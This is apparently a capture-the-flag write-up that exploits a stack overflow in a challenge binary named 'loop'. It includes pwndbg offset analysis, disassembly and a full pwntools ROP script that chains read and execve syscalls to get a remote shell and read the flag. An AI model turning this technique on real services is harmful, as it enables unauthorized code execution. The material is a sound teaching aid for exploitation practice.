## Question 

Can you pwn this mysterious service?

nc 0.cloud.chals.io 34997

## Solution

Testing some initial input, we realize we can influence both RAX and \[RSP\], after 73 and 33 bytes respectively.

```
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> r
Starting program: /root/workspace/loop 
The end is the beginning, and the beginning is the end
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
...

pwndbg> x/s $rsp
0x7fffffffe648:	"aaataaauaaavaaawaaaxaaayaaa\n"
pwndbg> x/s $rax
0x6b6161616a616161:	<error: Cannot access memory at address 0x6b6161616a616161>
pwndbg> cyclic -l aaat
73
pwndbg> cyclic -l 0x6a616161
33
```

Since the binary uses syscalls(), we should be able to construct our own syscalls to execve(). However, since the binary does not have a "/bin/sh" string, we will need to write one to memory ourselves. Luckily, there is a writable region of memory mapped at 0x666000.

```
00401000  int64_t _start() __noreturn

00401000  {
00401019      syscall(sys_write {1}, 1, "The end is the beginning, and th…", 0x37);
00401042      syscall(sys_mmap {9}, 0x666000, 0x1000, 3, 0x22, 0xffffffff, 0);
0040104b      trial();
0040105a      syscall(sys_exit {0x3c}, 0);
0040105a      /* no return */
0040105a  }
```

There are a couple syscalls() calls in the binary. Since we will need to perform both a SYS_read and SYS_execve, picking the right one proves important. We can reuse the syscall used for the earlier SYS_mmap since, it immediately enters the main trial() function afterwards. This will allow us to perform a second overflow.

```
0040103d  b809000000         mov     eax, 0x9
00401042  0f05               syscall 
00401044  48c7c3ffffffff     mov     rbx, 0xffffffffffffffff
0040104b  e810000000         call    trial
00401050  bf00000000         mov     edi, 0x0
00401055  b83c000000         mov     eax, 0x3c
0040105a  0f05               syscall 

```

Putting it together, we will:
	- syscall(SYS_exec, path=data, argv=0, envp=0)
	- send "/bin/sh\0\n"
	- syscall(SYS_read, fd=0x0, buf=data, len=9)

Our final exploit follows:

```python3
from pwn import *
import time

e = context.binary = ELF("./loop")
p = remote('0.cloud.chals.io', 34997)
r = ROP(e)

pop_rdi = p64((r.find_gadget(['pop rdi', 'ret']))[0])
pop_rsi = p64((r.find_gadget(['pop rsi', 'ret']))[0])
pop_rdx = p64((r.find_gadget(['pop rdx', 'ret']))[0])
syscall = p64(0x401042)
data = 0x666000


def write_rax(rax):
    '''33 bytes to write rax, 73 bytes to overflow [rsp]'''
    return cyclic(33)+p64(rax)+cyclic(32)


def sys_exec():
    '''syscall(SYS_exec, path=*data, argv=0, envp=0)'''
    pad = write_rax(constants.SYS_execve)
    chain = pop_rdi
    chain += p64(data)
    chain += pop_rsi
    chain += p64(0x0)
    chain += pop_rdx
    chain += p64(0x0)
    chain += syscall
    p.sendline(pad + chain)


def sys_read():
    '''syscall(SYS_read, fd=0x0, buf=*data, len=9)'''
    pad = write_rax(constants.SYS_read)
    chain = pop_rdi
    chain += p64(0x0)
    chain += pop_rsi
    chain += p64(data)
    chain += pop_rdx
    chain += p64(0x9)
    chain += syscall
    p.sendline(pad + chain)


def send_sh():
    '''send "/bin/sh"'''
    time.sleep(1)
    p.sendline(b"/bin/sh\0")


sys_read()
send_sh()
sys_exec()

p.interactive()
```
Running it gives us a shell and we can read the flag.

```
~/workspace $ python3 pwn-loop.py 

[+] Opening connection to 0.cloud.chals.io on port 34997: Done
[*] Loaded 6 cached gadgets for './loop'
[*] Switching to interactive mode
The end is the beginning, and the beginning is the end
Proceed? (y/n): Proceed? (y/n): $ whoami
loop
$ cat /home/loop/flag.txt
FLAG{4ll_7h15_l00p1ng_g07_m3_d1zzy}
```

